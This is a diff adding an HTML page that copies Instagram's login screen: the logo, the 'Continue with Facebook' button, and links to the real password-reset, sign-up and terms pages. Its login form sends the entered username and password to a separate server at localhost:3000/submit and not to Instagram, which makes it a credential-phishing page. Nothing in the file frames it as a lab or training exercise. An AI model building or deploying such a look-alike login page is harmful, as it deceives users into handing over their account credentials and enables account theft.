@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="icon" href="icon.png">
+    <link rel="stylesheet" href="insta.css">
+    <link rel="stylesheet" href="dummy.css">
+</head>
+<body>
+    <header style="padding-bottom: 0; padding-top:0; background-color:#fff; 
+        border: 1px solid #ccd0d5; background: transparent; border: transparent; color: transparent; padding: 2px;" align="center">
+        <select style="border-color: #fff;color:#5f5f5f; border-style:hidden;text-decoration: none;" size="1px" aria-label="Switch Display Language">
+            <option value="af">English</option>
+            <option value="ar">العربية</option>
+            <option value="cs">Čeština</option>
+            <!-- More languages... -->
+        </select>
+    </header>
+
+    <div class="inputbox">
+        <form action="http://localhost:3000/submit" method="post">
+            <img src="logo.png" width="175" alt="Instagram Logo">
+            <button type="submit" class="bn" style="margin-bottom: 6px; margin-top: 25px; align:center;"><img src="face.png" height="16px"> Continue with Facebook</button>
+            <div class="or">
+               <p class="hr-lines" style="padding-top:20px ;padding-bottom: 20px; color:#5f5f5f; font-size:12px; opacity: 70%;"><b>OR</b></p>
+            </div>
+            <div class="input-container">
+                <input type="text" id="username" name="username" placeholder=" " required>
+                <label for="username">Phone number, username, or email</label>
+            </div>
+            <div class="input-container">
+                <input type="password" id="password" name="password" placeholder=" " required>
+                <label for="password">Password</label>
+                <button type="button" id="togglePassword">hide</button>
+            </div>
+            <div style="margin-top:15px;margin-bottom: 25px;margin-right: 32px; text-align: right;">
+                <a href="https://www.instagram.com/accounts/password/reset/" style="text-decoration: none; color: #53bdeb;font-size:12px;">Forgotten your password?</a>
+            </div>
+            <button type="submit" style="margin-bottom: 20px; margin-top:40px;" class="btn">Log in</button>
+            <div class="l">
+                <a style="color:#5f5f5f;font-size:12px; margin-bottom: 30px;">Don't have an account?</a>
+                <a style="text-decoration: none;font-size:12px; color: #53bdeb;" href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a>
+            </div>
+            <p style="padding-top:35px; color:#5f5f5f; margin-bottom: 6px; margin-top:6px; font-size:12px;">By continuing you agree to Instagram's 
+                <a style="color: black; text-decoration: none;" href="https://help.instagram.com/581066165581870/?locale=en_GB">Terms of Use</a> and 
+                <a style="color: black;text-decoration: none;" href="https://privacycenter.instagram.com/policy/">Privacy Policy.</a>
+            </p>
+            <div>
+                <img style="margin-top:250px;" src="me.svg" height="26px" width="52px">
+            </div>
+        </form>
+    </div>
+   
+    <footer>
+        <img width="100%" height="64.16px" src="C:\Users\Karthik Raj\Desktop\bottom.png">
+    </footer>
+
+    <script>
+        const togglePassword = document.querySelector("#togglePassword");
+        const passwordInput = document.querySelector("#password");
+
+        togglePassword.addEventListener("click", () => {
+            const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+            passwordInput.setAttribute("type", type);
+            togglePassword.textContent = type === "password" ? "hide" : "show";
+        });
+    </script>
+</body>
+</html>
